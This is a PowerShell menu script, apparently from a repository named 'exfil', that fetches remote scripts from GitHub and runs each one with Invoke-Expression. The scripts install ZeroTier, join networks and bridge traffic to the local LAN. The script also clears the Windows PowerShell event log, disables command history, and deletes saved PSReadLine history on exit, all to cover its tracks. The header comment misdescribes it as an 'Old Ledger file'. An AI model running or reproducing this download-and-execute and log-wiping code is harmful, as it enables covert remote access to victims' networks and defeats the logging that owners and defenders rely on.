<# Old Ledger file with rudimentory logic. #>
function Show-ActionMenu {
    param (
        [array] $Actions
    )
    while ($true) {
        Write-Host "-------------------------------------------------------------" -ForegroundColor Yellow -BackgroundColor Black
        
        $index = 1
        foreach ($actionUrl in $Actions) {
            $fileName = [System.IO.Path]::GetFileName($actionUrl)
            Write-Host "$index. $fileName"
            $index++
        }
        $selectedActionIndex = $(Write-Host "Enter the number, 'b' to go back, or type 'q' to quit: " -ForegroundColor Yellow -BackgroundColor Black -NoNewline; Read-Host)
        if ($selectedActionIndex -eq 'q') {
            Write-Host "Exiting..." -ForegroundColor Red
            # Add code to clear PSReadLine history
            $psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
            if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
                $files = Get-ChildItem -Path $psreadlineFolderPath
                if ($files.Count -gt 0) {
                    Remove-Item -Path "$psreadlineFolderPath\*" -Force
                }
            }
            break
        }
        if ($selectedActionIndex -eq 'b') {
            Write-Host "Going to Master Control..." -ForegroundColor Green
            $additionalUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/MasterControl.ps1"
            $additionalContent = (Invoke-WebRequest -Uri $additionalUrl -UseBasicParsing).Content
            Invoke-Expression $additionalContent
            continue
        }
        $selectedActionIndex = [int]$selectedActionIndex  # Cast input to an integer
        if ($selectedActionIndex -ge 1 -and $selectedActionIndex -le $Actions.Count) {
            $selectedUrl = $Actions[$selectedActionIndex - 1]
            $selectedAction = [System.IO.Path]::GetFileNameWithoutExtension($selectedUrl)
            Write-Host "You chose: $selectedAction" -ForegroundColor Green -BackgroundColor Black
            
            $urlContent = (Invoke-WebRequest -Uri $selectedUrl -UseBasicParsing).Content
            Invoke-Expression $urlContent
        }
        else {
            Write-Host "Invalid selection. Please choose a valid number, 'b' to go back, or type 'q' to quit: " -ForegroundColor Red -BackgroundColor Black
        }
    }
}
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$actions = @(
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTInstall.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTNetJoinLeaveHandler.ps1",
    "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTPassthroughToLan.ps1"
)
    
# Call the function to display the action menu and execute the selected action or quit
Show-ActionMenu -Actions $actions
Write-Host "Enter the number, 'b' to go back, or type 'q' to quit: " -ForegroundColor Yellow -BackgroundColor Black
